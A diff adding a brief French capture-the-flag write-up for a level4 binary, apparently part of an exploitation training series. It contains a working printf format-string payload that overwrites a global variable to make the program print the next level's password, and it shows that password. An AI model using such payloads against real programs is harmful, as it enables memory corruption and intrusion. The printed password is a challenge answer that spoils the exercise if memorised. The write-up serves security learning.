@@ -1,0 +1,17 @@
+le program affiche /home/user/level5/.pass si m a l'address 0x8049810 est egale a 0x1025544
+    if (m == 0x1025544) {
+        system("/bin/cat /home/user/level5/.pass");
+    }
+
+on utilise les format de printf pour ecrire dans m a l'address 0x8049810 la valeur 0x1025544
+
+address to change value: 0x8049810 == \x12\x98\x04\x08 et \x10\x98\x04\x08
+value for cmp: 0x1025544
+    hex     dec
+    5544 == 21828
+    0102 == 258
+
+offset of the interpreted buffer in the printf arg: 12
+
+$ echo -e '\x12\x98\x04\x08\x10\x98\x04\x08%250c%12$hn%21570c%13$hn' | ./level4
+0f99ba5e9c446258a69b290407a6c60859e9c2d25b26575cafc9ae6d75e9456a
